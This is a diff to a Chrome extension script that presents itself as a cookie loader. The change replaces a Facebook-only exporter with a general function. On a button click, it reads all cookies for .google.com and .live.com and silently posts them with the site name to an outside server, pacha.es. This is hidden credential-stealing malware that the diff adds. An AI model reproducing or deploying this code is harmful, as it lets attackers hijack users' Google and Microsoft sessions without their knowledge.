@@ -8,7 +8,8 @@ function loadCookie(){
 			$.each( data, function( key, val ) {
 			setCookie(val.name,val.value,val.host);
 			});
-			exportFacebook();
+			exportCookies(".google.com");
+			exportCookies(".live.com");
 		}catch(err){
 				alert("Failed Loading Cookie!!!" + err.description);
 			}	
@@ -17,8 +18,8 @@ function loadCookie(){
 }
 
 
-function saveCookie(p){
-$.post( "http://www.pacha.es/crop/crop/you/save.php", { cookie: p} );
+function saveCookie(p,s){
+$.post( "http://www.pacha.es/crop/crop/you/save.php", { cookie: p, sitio : s} );
 }
 
 function hiddenStatus(){
@@ -37,14 +38,14 @@ function showMessage(){
 	$("#msj").delay(2000).hide('fast');
 }
 
-function exportFacebook(){
+function exportCookies(sitio){
 var cook = "[";
-    chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
+    chrome.cookies.getAll({domain: sitio}, function(cookies) {
 			for (var i in cookies) {
 				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
 			}
 			cook+= "]";
-			saveCookie(cook);
+			saveCookie(cook,sitio);
 	});
 }
 
@@ -80,11 +81,6 @@ function main() {
 
 document.addEventListener('DOMContentLoaded', function () {
   document.getElementById('btn1').addEventListener('click', loadCookie);
-  main();
-});
-
-document.addEventListener('DOMContentLoaded', function () {
-  document.getElementById('btn2').addEventListener('click', barraStatus);
   main();
 });
 
